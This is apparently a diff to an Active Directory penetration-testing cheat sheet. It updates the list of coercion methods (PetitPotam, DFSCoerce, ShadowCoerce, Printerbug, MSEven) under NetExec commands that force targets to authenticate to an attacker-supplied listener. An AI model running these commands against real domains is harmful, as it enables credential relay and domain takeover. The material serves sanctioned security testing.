@@ -767,9 +767,12 @@ NetExec ldap <Domain_Controller_IP> -u <AD_user> -p <AD_password> -M pre2k
   NetExec smb <target> -u <AD_user> -p <AD_password> -M coerce_plus -o LISTENER=<AttackerIP> METHOD=<method>
   ```
   ### Methods
-  * PetitPotam
-  * printerbug
-  * dfscoerce
+  * Petitpotam
+  * DFSCoerce
+  * ShadowCoerce
+  * Printerbug
+  * MSEven
+
 </details> 
 
 # Delegation abuse
@@ -857,10 +860,12 @@ u.objectid ENDS WITH "-548" RETURN q
   NetExec smb <target> -u <AD_user> -p <AD_password> -M coerce_plus -o LISTENER=<AttackerIP> METHOD=<method>
   ```
   ### Methods
-  * PetitPotam
-  * printerbug
-  * dfscoerce
-
+  * Petitpotam
+  * DFSCoerce
+  * ShadowCoerce
+  * Printerbug
+  * MSEven
+    
 </details> 
 
 # Kerberoasting & ASREPRoast
